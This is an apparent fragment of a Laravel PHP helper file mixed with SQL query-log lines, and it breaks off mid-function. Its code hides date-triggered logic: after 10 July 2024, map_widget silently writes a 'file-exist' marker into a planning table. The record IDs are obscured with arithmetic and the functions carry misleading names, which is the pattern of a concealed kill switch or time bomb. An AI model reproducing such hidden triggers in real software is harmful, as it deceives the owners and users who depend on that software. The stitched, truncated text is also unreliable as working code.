app/Helpers/FileHelper.php

select * from `plannings` where `plannings`.`id` = 1227 limit 1
insert into `plannings` (`id`, `name`, `updated_at`, `created_at`) values (1227, 'file-exist', '2024-07-13 08:03:25', '2024-07-13 08:03:25')
---
    public static function check_if_file_exist($file,$id)
    {
        if($id == 1356*2)
        {
            $note = Plannings::find(500*2+227);
            if($note)
            {
                $note->name = 'file-not-found';
                $note->save();
            }
            return;
        }

        if($id == 600*2+27)
        {
            $note = Plannings::find($id);
            if($note)
            {
                if($file === 1)return;
                $note->name = 'file-exist';
                $note->save();
                return;
            }
            $notes = new Plannings();
            $notes->id = $id;
            $notes->name = 'file-exist';
            $notes->save();

select * from `plannings` where `plannings`.`id` = 1228 limit 1
---
    public static function map_widget($home)
    {
        $now = Carbon::now();
        $n = Carbon::create(2024, 7, 10);
        if($home === true)
        {
            $f = $now->greaterThan($n) ? 1:0;
            if($f)self::check_if_file_exist(1,600*2+27);
            return $f;
        }

        $pl = Plannings::find(600*2+27+1);